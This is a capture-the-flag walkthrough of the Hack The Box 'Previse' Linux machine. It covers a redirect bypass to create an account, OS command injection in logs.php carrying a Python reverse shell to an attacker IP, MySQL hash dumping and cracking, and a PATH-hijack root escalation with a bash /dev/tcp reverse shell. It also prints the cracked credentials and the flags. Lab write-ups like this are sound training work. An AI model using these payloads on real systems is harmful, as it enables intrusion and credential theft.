# Introduction

[![Armageddon](https://www.hackthebox.eu/storage/avatars/e3c542ada4b134e29e534e3081ef9650.png)](https://app.hackthebox.eu/machines/Previse)

| Point | Description |
| :------:| :------: |
| Name | Previse |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 07 Aug 2021   |
| IP | 10.10.11.104   |
| Owned | 23 Aug 2021 |

# Short retelling

* Enumeration and find directories
* Read url with curl
* Create POST request to server
* Find way to OS injection
* Get user.txt
* Privilege escalation with PATH hijacking

# Enumeration

## Nmap

Recon host 10.10.10.104 with Nmap and Add previse.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# nmap -T4 -A -p- --min-rate 500 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 23:17 EDT
Nmap scan report for previse.htb (10.10.11.104)
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/24%OT=22%CT=1%CU=30080%PV=Y%DS=2%DC=T%G=Y%TM=6125B6D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O
OS:3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   202.68 ms 10.10.16.1
2   95.25 ms  previse.htb (10.10.11.104)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.28 seconds
```
Checking 80 http service

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr1.PNG)

We see authorization form.

Trying use default creds - no way.
Trying use SQL Bypass Auth - no way.
Trying capture POST authorization request - no way.

## gobuster

Let's try to find some directories

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# gobuster dir -e -u http://previse.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.htm,.html,.phtml,.js,.zip,.rar,.tar -s 200,301,302 -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://previse.htb/
[+] Threads:        100
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     tar,txt,htm,html,phtml,rar,php,js,zip
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/08/24 23:38:23 Starting gobuster
===============================================================
http://previse.htb/accounts.php (Status: 302)
http://previse.htb/config.php (Status: 200)
http://previse.htb/css (Status: 301)
http://previse.htb/download.php (Status: 302)
http://previse.htb/favicon.ico (Status: 200)
http://previse.htb/files.php (Status: 302)
http://previse.htb/footer.php (Status: 200)
http://previse.htb/header.php (Status: 200)
http://previse.htb/index.php (Status: 302)
http://previse.htb/index.php (Status: 302)
http://previse.htb/js (Status: 301)
http://previse.htb/login.php (Status: 200)
http://previse.htb/logs.php (Status: 302)
http://previse.htb/logout.php (Status: 302)
http://previse.htb/nav.php (Status: 200)
http://previse.htb/status.php (Status: 302)
===============================================================
2021/08/24 23:39:17 Finished
===============================================================
```

Ok, we find directories with status 302 `The HTTP response status code 302 Found is a common way of performing URL redirection.`

If we will try to open http://previse.htb/accounts.php, we will get redirecto to http://previse.htb/login.php

In http://previse.htb/nav.php wec can see navigation panel and every time we get redirection to login.php after clicking.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr2.PNG)

# Explotation

But if we try to open http://previse.htb/accounts.php with curl, we will see html code.

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# curl http://previse.htb/accounts.php

<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
    
            
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
        <script src="js/uikit.min.js"></script>
        <script src="js/uikit-icons.min.js"></script>
   
<title>Previse Create Account</title>
</head>
<body>
    
<nav class="uk-navbar-container" uk-navbar>
    <div class="uk-navbar-center">
        <ul class="uk-navbar-nav">
            <li class="uk-active"><a href="/index.php">Home</a></li>
            <li>
                <a href="accounts.php">ACCOUNTS</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="files.php">FILES</a></li>
            <li>
                <a href="status.php">MANAGEMENT MENU</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="status.php">WEBSITE STATUS</a></li>
                        <li><a href="file_logs.php">LOG DATA</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="#" class=".uk-text-uppercase"></span></a></li>
            <li>
                <a href="logout.php">
                    <button class="uk-button uk-button-default uk-button-small">LOG OUT</button>
                </a>
            </li>
        </ul>
    </div>
</nav>

<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Add New Account</h2>
        <p>Create new user.</p>
        <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>
        <p>Usernames and passwords must be between 5 and 32 characters!</p>
    </p>
        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
    </div>
</section>
            
<div class="uk-position-bottom-center uk-padding-small">
        <a href="https://m4lwhere.org/" target="_blank"><button class="uk-button uk-button-text uk-text-small">Created by m4lwhere</button></a>
</div>
</body>
</html>

```

Also we can see code with burp.

Reading code... Ok, we can create user with this page. 

We need to use post request to acconuts.php

`<form role="form" method="post" action="accounts.php">`

There are three fields

`<input type="text" name="username" class="uk-input" id="username" placeholder="Username">`

`<input type="password" name="password" class="uk-input" id="password" placeholder="Password">`

`<input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">`

Lets create HTTP POST request to /accounts.php with burp.

At first we should intercept authorization request.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr3.PNG)

Send packet to repeater and edit fields

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr4.PNG)

And we successfully create user, try to login and success

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr5.PNG)

Find *sitebackup.zip* in http://previse.htb/files.php. Lets download it.

Checking config.php and find creds to connect mysql databases

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# cd siteBackup                       
                                                                                                                                                                                                                 
┌──(root💀kali)-[/home/kali/HTB/Previse/siteBackup]
└─# ls
accounts.php  config.php  download.php  file_logs.php  files.php  footer.php  header.php  index.php  login.php  logout.php  logs.php  nav.php  status.php
                                                                                                                                                                                                                 
┌──(root💀kali)-[/home/kali/HTB/Previse/siteBackup]
└─# cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

Also we find interesting comment in *logs.php*

```
┌──(root💀kali)-[/home/kali/HTB/Previse/siteBackup]
└─# cat logs.php  
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>
```
After analyzing, I understand that looks like way of OS injection.
We can send RCE like ```delim=RCE```

Backend uses this script when get request from frontend http://previse.htb/file_logs.php 

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr6.PNG)

Intercept request to inject OS command.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/pr7.PNG)

And add python reverse-shell to delim

```
POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://previse.htb
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=047geh7rnvgq04s58ts0j2101n
Upgrade-Insecure-Requests: 1

delim=comma;python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.200",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And we get reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/Previse/siteBackup]
└─# nc -lvp 4444                               
listening on [any] 4444 ...
connect to [10.10.17.200] from previse.htb [10.10.11.104] 36270
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
previse
```

Upgrade our shell and lets connect to mysql with creds.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$ ls
ls
accounts.php                download.php       footer.php  logs.php
android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php
android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest
apple-touch-icon.png        favicon.ico        js          status.php
config.php                  file_logs.php      login.php
css                         files.php          logout.php
www-data@previse:/var/www/html$ mysql -u root -e 'use previse; show tables' -p
<tml$ mysql -u root -e 'use previse; show tables' -p
Enter password: mySQL_p@ssw0rd!:)

+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
www-data@previse:/var/www/html$ mysql -u root -e 'use previse;select * from accounts' -p
< -u root -e 'use previse;select * from accounts' -p
Enter password: mySQL_p@ssw0rd!:)

+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | pavel    | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-25 04:46:34 |
|  3 | admin    | $1$🧂llol$G3KunFyMrVvsqYP1JpRi70 | 2021-08-25 04:48:52 |
+----+----------+------------------------------------+---------------------+
```

And we find credentials

```m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.```

Lets crack this hash with *John*

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:29 9.09% (ETA: 01:18:22) 0g/s 50103p/s 50103c/s 50103C/s nahiel..nagkulit
Session aborted
                                                                                                                                                                                                                 
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=md5crypt-long                                                                                                                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:11:28 DONE (2021-08-25 01:25) 0.001453g/s 10774p/s 10774c/s 10774C/s ilovecody91..ilovecody112235!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we get credentials

```m4lwhere:ilovecody112235!```

Login with SSH and get **user.txt**

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# ssh m4lwhere@previse.htb
m4lwhere@previse.htb's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 25 05:41:51 UTC 2021

  System load:  0.0               Processes:           178
  Usage of /:   49.4% of 4.85GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ ls
user.txt
m4lwhere@previse:~$ cat user.txt 
57a414abb54ea62246ae92c3c42818a7

```

# Privilege Escalation

Before running the LinPEAS, check the user's privileges

```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Ok, we can run access_backup.sh with root privileges. Checking this script.

```
m4lwhere@previse:~$ ls -lvp /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6 12:49 /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

We can only read it. And it's easy. We need to use PATH hijacking to Privilege escaltion like in [Laboratory](https://github.com/Pash3nlee/HackTheBox/blob/main/Easy/Laboratory.md)

1. Create gzip in home or tmp folder
2. Write reverse shell there
3. Export new directory to PATH
4. Run it

```
m4lwhere@previse:~$ ls
user.txt
m4lwhere@previse:~$ nano gzip
m4lwhere@previse:~$ cat gzip 
/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.200/5555 0>&1'
m4lwhere@previse:~$ chmod +x gzip
m4lwhere@previse:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ export PATH=$(pwd):$PATH
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh

```

And we get reverse shell and **root.txt**

```
┌──(root💀kali)-[/home/kali/HTB/Previse]
└─# nc -lvp 5555
listening on [any] 5555 ...
connect to [10.10.17.200] from previse.htb [10.10.11.104] 48458
root@previse:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@previse:~# cd /root
cd /root
root@previse:/root# ls
ls
root.txt
root@previse:/root# cat root.txt    
cat root.txt
5187fe1b4173836f7fe0d0dd5cf155c4
```

# Resources

1. 

